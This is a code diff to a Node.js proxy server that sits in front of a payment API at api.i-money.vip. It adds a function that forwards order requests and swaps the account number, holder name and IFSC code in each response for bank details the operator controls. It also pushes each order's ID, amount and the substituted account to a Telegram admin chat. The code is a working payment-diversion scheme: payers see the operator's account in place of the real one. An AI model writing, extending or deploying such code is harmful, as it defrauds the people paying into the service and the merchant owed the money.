@@ -301,28 +301,87 @@ Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
   await transparentProxy(req, res);
 });
 
-app.post('/money/orderId', async (req, res) => {
+async function proxyAndReplaceBankDetails(req, res, label) {
   const bankData = await loadData();
-  if (bankData.adminChatId && bot) {
-    bot.sendMessage(bankData.adminChatId,
-`🔔 New Order!
-Amount: ₹${req.parsedBody?.amount || 'N/A'}
+  const active = getActiveBank(bankData);
+
+  try {
+    const url = ORIGINAL_API + req.originalUrl;
+    const forwardHeaders = {};
+    for (const [key, val] of Object.entries(req.headers)) {
+      const k = key.toLowerCase();
+      if (k === 'host' || k === 'connection' || k === 'content-length' ||
+          k === 'transfer-encoding' || k.startsWith('x-vercel') || k.startsWith('x-forwarded')) continue;
+      forwardHeaders[key] = val;
+    }
+    forwardHeaders['host'] = 'api.i-money.vip';
+
+    const opts = { method: req.method, headers: forwardHeaders };
+    if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
+      opts.body = req.rawBody;
+      forwardHeaders['content-length'] = String(req.rawBody.length);
+    }
+
+    const response = await fetch(url, opts);
+    const respBody = await response.text();
+
+    let jsonResp;
+    try { jsonResp = JSON.parse(respBody); } catch(e) { jsonResp = null; }
+
+    if (jsonResp && jsonResp.data && active) {
+      if (jsonResp.data.receiveAccountNo !== undefined) jsonResp.data.receiveAccountNo = active.accountNo;
+      if (jsonResp.data.receiveAccountName !== undefined) jsonResp.data.receiveAccountName = active.accountHolder;
+      if (jsonResp.data.receiveIfsc !== undefined) jsonResp.data.receiveIfsc = active.ifsc;
+      if (jsonResp.data.accountNo !== undefined) jsonResp.data.accountNo = active.accountNo;
+      if (jsonResp.data.accountName !== undefined) jsonResp.data.accountName = active.accountHolder;
+      if (jsonResp.data.accountHolder !== undefined) jsonResp.data.accountHolder = active.accountHolder;
+      if (jsonResp.data.ifsc !== undefined) jsonResp.data.ifsc = active.ifsc;
+      if (jsonResp.data.ifscCode !== undefined) jsonResp.data.ifscCode = active.ifsc;
+    }
+
+    if (bankData.adminChatId && bot) {
+      const orderId = jsonResp?.data?.orderId || req.parsedBody?.orderId || 'N/A';
+      const amount = jsonResp?.data?.amount || req.parsedBody?.amount || 'N/A';
+      bot.sendMessage(bankData.adminChatId,
+`🔔 ${label}
+Order: ${orderId}
+Amount: ₹${amount}
+Bank: ${active ? active.accountHolder : 'None'}
+Acc: ${active ? active.accountNo : 'N/A'}
 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
-    ).catch(() => {});
+      ).catch(() => {});
+    }
+
+    const respHeaders = {};
+    response.headers.forEach((val, key) => {
+      const k = key.toLowerCase();
+      if (k !== 'transfer-encoding' && k !== 'connection' && k !== 'content-encoding' && k !== 'content-length') {
+        respHeaders[key] = val;
+      }
+    });
+
+    const finalBody = jsonResp ? JSON.stringify(jsonResp) : respBody;
+    respHeaders['content-type'] = 'application/json; charset=utf-8';
+    respHeaders['content-length'] = String(Buffer.byteLength(finalBody));
+
+    res.writeHead(response.status, respHeaders);
+    res.end(finalBody);
+  } catch (e) {
+    console.error('Proxy+replace error:', req.method, req.originalUrl, e.message);
+    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
   }
-  await transparentProxy(req, res);
+}
+
+app.post('/money/orderId', async (req, res) => {
+  await proxyAndReplaceBankDetails(req, res, 'New Order!');
 });
 
 app.post('/money/create/v2', async (req, res) => {
-  const bankData = await loadData();
-  if (bankData.adminChatId && bot) {
-    bot.sendMessage(bankData.adminChatId,
-`🔔 New Order (v2)!
-Amount: ₹${req.parsedBody?.amount || 'N/A'}
-Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
-    ).catch(() => {});
-  }
-  await transparentProxy(req, res);
+  await proxyAndReplaceBankDetails(req, res, 'New Order (v2)!');
+});
+
+app.post('/money/init/order', async (req, res) => {
+  await proxyAndReplaceBankDetails(req, res, 'Init Order!');
 });
 
 app.get('/health', async (req, res) => {
